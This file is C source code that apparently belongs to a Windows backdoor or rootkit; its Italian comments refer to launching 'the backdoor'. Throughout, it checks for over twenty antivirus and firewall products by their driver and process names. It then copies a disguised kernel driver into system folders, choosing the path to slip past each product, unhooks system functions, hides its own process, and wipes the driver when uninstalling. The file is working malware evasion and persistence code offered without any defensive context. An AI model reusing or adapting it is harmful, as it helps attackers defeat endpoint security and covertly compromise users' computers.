BOOL IsDriverRunning(WCHAR *driver_name)
{
	DWORD dummy;
	LPVOID *drivers;
	DWORD cbNeeded = 0;
	int cDrivers, i;

	FNC(EnumDeviceDrivers)((LPVOID *)&dummy, sizeof(dummy), &cbNeeded);
	if (cbNeeded == 0)
		return FALSE;
	if (!(drivers = (LPVOID *)malloc(cbNeeded)))
		return FALSE;

	if( FNC(EnumDeviceDrivers)(drivers, cbNeeded, &dummy) ) { 
		WCHAR szDriver[1024];
		cDrivers = cbNeeded/sizeof(LPVOID);
		for (i=0; i < cDrivers; i++ ) {
			if(FNC(GetDeviceDriverBaseNameW)(drivers[i], szDriver, sizeof(szDriver)/sizeof(szDriver[0]))) { 
				if (!_wcsicmp(szDriver, driver_name)) {
					free(drivers);
					return TRUE;
				}
			}
		}
	}
	free(drivers);
	return FALSE;
}

BOOL IsEndPoint()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"wpsdrvnt.sys") && IsDriverRunning(L"srtsp.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\wpsdrvnt.sys");

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\srtsp.sys");

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return FALSE;
	}

	FNC(FindClose)(hff);
	return TRUE;
}

// XXX - Que - Detection 
BOOL IsComodo2()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"inspect.sys") && IsDriverRunning(L"cmdmon.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\inspect.sys");

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\cmdmon.sys");

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return FALSE;
	}

	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsComodo3()
{
	// XXX - Que - riabilito la funzione 
	//return FALSE;

	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"inspect.sys") && IsDriverRunning(L"cmdhlp.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\inspect.sys");

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\cmdhlp.sys");

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) 
		return FALSE;
	FNC(FindClose)(hff);

	return TRUE;
}

BOOL IsAshampoo()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"AshAvScan.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\AshAvScan.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	if (HM_FindPid("AntiSpyWare2Guard.exe", FALSE))
		return TRUE;
	if (HM_FindPid("AntiSpyWare2.exe", FALSE))
		return TRUE;

	return FALSE;
}

BOOL IsADAware()
{
	if (HM_FindPid("AAWService.exe", FALSE))
		return TRUE;
	return FALSE;
}


BOOL IsDeepFreeze()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"DeepFrz.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\DeepFrz.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsAvira()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"avgntmgr.sys") || IsDriverRunning(L"avgntdd.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\avgntmgr.sys");	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\avgntdd.sys");
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	return FALSE;
}

BOOL IsPCTools()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"PCTAppEvent.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\PCTAppEvent.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsBitDefender()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsX64System() && IsDriverRunning(L"BDHV.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\BDHV.SYS");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsBlink()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"eeyeh.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\eeyeh.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsSunBeltPF()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"SbFw.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\SbFw.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}


BOOL IsRising()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"rfwbase.sys") || IsDriverRunning(L"HookSys.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\rfwbase.sys");
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\HookSys.sys");
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	return FALSE;
}


BOOL IsZoneAlarm()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"vsdatant.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\vsdatant.sys");
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\vsdatant.sys");
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	return FALSE;
}

BOOL IsMcAfee()
{
	if (HM_FindPid("mcsysmon.exe", FALSE))
		return TRUE;
	return FALSE;
}

BOOL IsPGuard()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"procguard.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\procguard.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}


BOOL IsTrend()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"tmcomm.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\tmcomm.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsPanda()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"pavproc.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\pavproc.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsAVG()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"AVGIDSErHr.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\AVGIDSErHr.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	if (HM_FindPid("AVGIDSAgent.exe", FALSE))
		return TRUE;

	return FALSE;
}

BOOL IsAVG_IS()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"AVGIDSxx.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\AVGIDSxx.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff != INVALID_HANDLE_VALUE) {
		FNC(FindClose)(hff);
		return TRUE;
	}

	if (HM_FindPid("AVGIDSAgent.exe", FALSE))
		return TRUE;

	return FALSE;
}

BOOL IsFSecure()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"fsdfw.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\fsdfw.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	return TRUE;
}

BOOL IsAvast()
{
	if (IsDriverRunning(L"aswSP.sys") || IsDriverRunning(L"aswFsBlk.sys"))
		return TRUE;

	return FALSE;
}

BOOL IsKaspersky()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"klif.sys") && IsDriverRunning(L"kl1.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\klif.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	
	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\kl1.sys");

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) 
		return FALSE;
	FNC(FindClose)(hff);

	return TRUE;
}

BOOL IsKerio()
{
	WIN32_FIND_DATA fdata;
	char buffer[DLLNAMELEN];
	HANDLE hff;

	if (IsDriverRunning(L"fwdrv.sys") && IsDriverRunning(L"khips.sys"))
		return TRUE;

	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\fwdrv.sys");
	
	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE)
		return FALSE;
	FNC(FindClose)(hff);
	
	ZeroMemory(buffer, sizeof(buffer));
	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
	strcat(buffer, "\\system32\\drivers\\khips.sys");

	hff = FNC(FindFirstFileA)(buffer, &fdata);
	if (hff == INVALID_HANDLE_VALUE) 
		return FALSE;
	FNC(FindClose)(hff);

	return TRUE;
}

BOOL CopySystemDriver(WCHAR *drv_path)
{
	char sys_path[DLLNAMELEN];
	char temp_path[DLLNAMELEN];
	char comp_path[DLLNAMELEN*2];
	char *drv_scramb_name;
	PVOID old_value;
	
	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
		return FALSE;
	
	drv_scramb_name = H4DRIVER_NAME;

	old_value = DisableWow64Fs();

	if (IsKaspersky()) {
		sprintf(comp_path, "%s%s%s", sys_path, "\\", DRIVER_NAME);
		FNC(MoveFileExA)(HM_CompletePath(drv_scramb_name, temp_path), comp_path, MOVEFILE_WRITE_THROUGH);
	} else if (!IsComodo2() && !IsComodo3() && !IsAVG()) {
		sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\drivers\\", DRIVER_NAME);
		FNC(MoveFileExA)(HM_CompletePath(drv_scramb_name, temp_path), comp_path, MOVEFILE_WRITE_THROUGH);
	} else // Comodo non permette di scrivere in system32
		FNC(MoveFileExA)(HM_CompletePath(drv_scramb_name, temp_path), HM_CompletePath(DRIVER_NAME, comp_path), MOVEFILE_WRITE_THROUGH);

	RevertWow64Fs(old_value);

	HM_A2U(comp_path, (char *)drv_path);
	return TRUE;
}

// Cerca di togliere il più possibile del driver
BOOL UninstallDriver()
{
	HideDevice dev_unhook;
	WCHAR drv_path[DLLNAMELEN*2];

	if (!dev_unhook.unhook_isdev()) 
		return TRUE;
	
	dev_unhook.unhook_getpath(DRIVER_NAME_W, drv_path, sizeof(drv_path));

	for (DWORD i=0; i<MAX_DELETE_TRY; i++) {
		if (dev_unhook.unhook_uninstall(DRIVER_NAME_W)) {
			HM_WipeFileW(drv_path);
			return TRUE;
		}
		Sleep(DELETE_SLEEP_TIME);
	}
	return FALSE;
}


BOOL doUnhook()
{
	DWORD dummy;

	HideDevice dev_unhook;
	// Se il driver è già installato (dal dropper o offline) 
	// fa tutto ciò che serve
	if (IsVista(&dummy))
		dev_unhook.unhook_getadmin();
	if (!IsAvast())
		dev_unhook.unhook_all(FALSE);
	dev_unhook.unhook_func("ZwSetValueKey", TRUE);
	dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);

	// Se siamo su XP con Kaspersky o McAfee o Kerio
	// e non c'e' il driver, allora prova l'installazione
	if ((IsAvira() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsAshampoo() || IsEndPoint()) && !IsVista(&dummy) && (!dev_unhook.unhook_isdrv(DRIVER_NAME_W) && !dev_unhook.unhook_isdrv(DRIVER_NAME_OLD_W))) {
		WCHAR drv_path[DLLNAMELEN*2];
		
		// Copia il driver nella directory di destinazione dalla TMP (solo online)
		// in ogni caso torna il path di dove si dovrebbe trovare
		if (!CopySystemDriver(drv_path))
			return FALSE;
		
		HideDevice dev_unhook(drv_path);
		Sleep(500); //sleep paranoico
		// se non ci riesce non lancia la backdoor
		if (!dev_unhook.unhook_isdrv(DRIVER_NAME_W))
			return FALSE;

		if (!IsAvast())
			dev_unhook.unhook_all(FALSE);
		dev_unhook.unhook_func("ZwSetValueKey", TRUE);
		dev_unhook.unhook_hidepid(FNC(GetCurrentProcessId)(), TRUE);
	}

	return TRUE;
}